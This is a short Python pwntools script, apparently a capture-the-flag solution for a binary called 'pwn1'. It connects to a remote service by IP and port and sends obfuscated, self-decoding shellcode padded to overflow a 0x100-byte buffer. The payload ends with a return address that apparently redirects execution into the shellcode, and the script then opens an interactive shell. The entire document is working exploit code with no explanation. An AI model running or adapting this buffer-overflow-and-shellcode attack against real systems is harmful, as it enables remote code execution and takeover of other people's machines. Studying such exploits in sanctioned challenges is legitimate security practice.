from pwn import *
#p=process('./pwn1')
p=remote('101.200.187.112','9004')
p.recv()
sc='\xeb\x1b\x5f\x31\xc0\x6a\x53\x6a\x18\x59\x49\x5b\x8a\x04\x0f\xf6\xd3\x30\xd8\x88\x04\x0f\x50\x85\xc9\x75\xef\xeb\x05\xe8\xe0\xff\xff\xff\x1c\x7f\xc5\xf9\xbe\xa3\xe4\xff\xb8\xff\xb2\xf4\x1f\x95\x4e\xfe\x25\x97\x93\x30\xb6\x39\xb2\x2c'
p.sendline(sc+'a'*(0x100-len(sc))+p32(0x804A060))
p.interactive()
